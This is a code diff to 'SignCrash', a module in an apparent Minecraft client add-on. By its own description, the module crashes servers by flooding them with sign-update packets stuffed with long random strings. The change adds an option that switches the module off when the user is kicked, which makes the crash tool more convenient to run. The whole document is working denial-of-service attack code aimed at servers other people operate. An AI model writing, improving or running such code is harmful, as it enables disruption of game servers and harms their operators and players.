@@ -2,8 +2,10 @@ package WideCat.MeteorCrashAddon.modules;
 
 import WideCat.MeteorCrashAddon.MeteorCrashAddon;
 import meteordevelopment.orbit.EventHandler;
+import minegame159.meteorclient.events.game.GameLeftEvent;
 import minegame159.meteorclient.events.world.TickEvent;
 import minegame159.meteorclient.modules.Module;
+import minegame159.meteorclient.settings.BoolSetting;
 import minegame159.meteorclient.settings.IntSetting;
 import minegame159.meteorclient.settings.Setting;
 import minegame159.meteorclient.settings.SettingGroup;
@@ -24,6 +26,13 @@ public class SignCrash extends Module {
             .build()
     );
 
+    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
+            .name("auto-disable")
+            .description("Disables module on kick.")
+            .defaultValue(false)
+            .build()
+    );
+
     public SignCrash() {
         super(MeteorCrashAddon.CATEGORY, "sign-crash", "Tries to crash the server by spamming sign updates packets.");
     }
@@ -36,6 +45,13 @@ public class SignCrash extends Module {
                     rndBinStr(598), rndBinStr(598));
             Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
         }
+    }
+
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
+        if (!autoDisable.get()) return;
+
+        toggle();
     }
 
     public static String rndBinStr(int size) {
